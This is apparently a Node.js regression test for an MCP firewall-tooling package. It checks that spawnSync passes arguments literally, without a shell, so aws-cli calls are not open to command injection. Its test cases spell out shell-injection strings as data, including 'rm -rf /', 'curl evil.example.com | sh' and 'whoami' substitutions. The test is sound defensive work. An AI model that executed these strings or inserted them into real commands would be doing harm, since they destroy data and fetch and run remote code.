// Issue #759 regression: prove that spawnSync passes argv elements
// literally to the spawned process without involving a shell. If
// this guarantee ever weakens (e.g. by a Node patch that flips
// `shell: true` by default), every aws-cli call site in mcp/ngfw
// would silently regain a command-injection path. These tests fail
// loudly in that case.
//
// Mirrors mcp/ops/spawn-roundtrip.test.js (issue #763); kept as a
// per-package copy because each MCP server is its own npm package
// and there is no shared workspace.

import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { writeFileSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

let scriptPath;
let workDir;
// True iff this environment can actually spawn node and capture its
// stdout. Some sandboxes (codex review runs, restricted CI) deny
// spawnSync with EPERM; these tests are integration-style and there
// is nothing meaningful to assert without a working spawn, so we
// skip rather than report a false failure. Real CI and developer
// machines run every case.
let spawnAvailable = false;

before(() => {
  workDir = mkdtempSync(path.join(tmpdir(), "ngfw-argv-roundtrip-"));
  scriptPath = path.join(workDir, "argv-echo.mjs");
  // scriptPath is a freshly minted tmpdir entry, never user input.
  // eslint-disable-next-line security/detect-non-literal-fs-filename
  writeFileSync(
    scriptPath,
    "process.stdout.write(JSON.stringify(process.argv.slice(2)));\n"
  );

  const probe = spawnSync(
    process.execPath,
    [scriptPath, "probe"],
    { encoding: "utf-8", timeout: 5000 }
  );
  spawnAvailable =
    !probe.error && probe.status === 0 && probe.stdout === '["probe"]';
});

after(() => {
  if (workDir) rmSync(workDir, { recursive: true, force: true });
});

function roundtrip(payload) {
  const result = spawnSync(
    process.execPath,
    [scriptPath, ...payload],
    { encoding: "utf-8", timeout: 10000 }
  );
  if (result.error) throw result.error;
  if (result.status !== 0) {
    throw new Error(
      `argv echo helper failed: status=${result.status} stderr=${result.stderr}`
    );
  }
  return JSON.parse(result.stdout);
}

const LITERAL_PRESERVATION_CASES = new Map([
  ["$() command substitution", ["--filters", "Name=tag:Name,Values=$(rm -rf /)"]],
  ["backtick command substitution", ["--filters", "Name=tag:Name,Values=`id`"]],
  ["single quotes", ["--parameters", "'; rm -rf /; echo '"]],
  ["double quotes", ["--filters", '"; whoami; echo "']],
  ["semicolons", ["--filters", "foo; rm -rf /"]],
  ["ampersands and pipes", ["--filters", "foo && curl evil.example.com | sh"]],
  ["spaces inside a single argv element", ["--query", "this is one element"]],
  ["newlines inside an argv element", ["--filters", "line one\nline two"]],
  ["secret-id payloads with metacharacters", [
    "secretsmanager",
    "get-secret-value",
    "--secret-id",
    "shifter/ngfw/$(id)/`whoami`/key",
  ]],
  ["SSM document payloads with every metacharacter", [
    "ssm",
    "send-command",
    "--parameters",
    "$()`'\";|&\nsh -c 'whoami'",
  ]],
]);

describe("spawnSync argv round-trip (issue #759)", () => {
  for (const [label, payload] of LITERAL_PRESERVATION_CASES) {
    it(`preserves ${label} literally`, (t) => {
      if (!spawnAvailable) {
        t.skip("spawn restricted in this environment");
        return;
      }
      assert.deepEqual(roundtrip(payload), payload);
    });
  }

  it("preserves the SSM --parameters JSON shape with embedded shell metacharacters", (t) => {
    if (!spawnAvailable) {
      t.skip("spawn restricted in this environment");
      return;
    }
    const params = JSON.stringify({
      commands: [
        // Mirrors the worst-case payload that buildNgfwSshCommands would
        // assemble: a base64-decode pipeline plus a metacharacter-laden
        // PAN-OS command. The base64 segment is shell-safe; the test
        // here is whether the surrounding JSON survives spawnSync.
        "printf %s 'JCh3aG9hbWkpCg==' | base64 -d | ssh admin@10.0.0.1 2>&1",
      ],
    });
    const payload = [
      "ssm",
      "send-command",
      "--instance-ids",
      "i-0123456789abcdef0",
      "--document-name",
      "AWS-RunShellScript",
      "--parameters",
      params,
    ];
    const result = roundtrip(payload);
    assert.deepEqual(result, payload);
    assert.ok(
      result[result.length - 1].includes("base64 -d"),
      "JSON-embedded base64 pipeline must round-trip literally"
    );
  });
});
